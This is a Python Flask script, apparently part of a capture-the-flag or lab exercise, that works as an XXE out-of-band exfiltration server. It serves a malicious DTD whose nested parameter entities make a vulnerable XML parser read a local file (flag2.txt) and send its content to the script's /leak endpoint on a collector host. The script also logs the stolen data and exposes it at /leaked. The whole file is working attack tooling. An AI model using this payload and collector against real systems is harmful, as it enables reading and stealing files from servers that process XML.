import os
from flask import Flask, request, jsonify

app = Flask(__name__)
LEAKS = []

COLLECTOR_HOST = os.environ.get("COLLECTOR_HOST", "collector:9000")

DTD = f"""<!ENTITY % file SYSTEM "file:///flag2.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{COLLECTOR_HOST}/leak?data=%file;'>">
%eval;
%exfil;
"""

@app.route("/evil.dtd")
def evil_dtd():
    # Served to the vulnerable app's parser; it reads the local flag and
    # posts its content back to us via a nested parameter entity.
    return DTD, 200, {"Content-Type": "application/xml-dtd"}


@app.route("/leak")
def leak():
    data = request.args.get("data", "")
    LEAKS.append(data)
    return "ok"


@app.route("/leaked")
def leaked():
    return jsonify(leaks=LEAKS)


@app.route("/")
def home():
    return "XXE OOB collector. GET /evil.dtd to see the payload, GET /leaked to see captured data."


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)
